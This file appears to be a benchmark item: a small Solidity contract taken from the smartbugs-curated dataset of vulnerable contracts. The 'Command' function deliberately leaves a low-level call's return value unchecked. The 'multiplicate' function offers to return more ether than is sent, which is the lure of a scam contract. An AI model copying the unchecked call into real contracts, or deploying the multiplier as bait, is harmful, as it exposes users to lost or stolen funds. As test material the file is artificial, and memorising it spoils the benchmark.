// Benchmark candidate ported from smartbugs-curated: dataset/unchecked_low_level_calls/0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol
// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.20;

contract SbMultiplicatorX4
{
    address public Owner = msg.sender;

    receive() external payable{}

    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        payable(Owner).transfer(address(this).balance);
    }

    function Command(address adr,bytes memory data)
    payable
    public
    {
        require(msg.sender == Owner);
        adr.call{value: msg.value}(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=address(this).balance)
        {
            payable(adr).transfer(address(this).balance+msg.value);
        }
    }
}
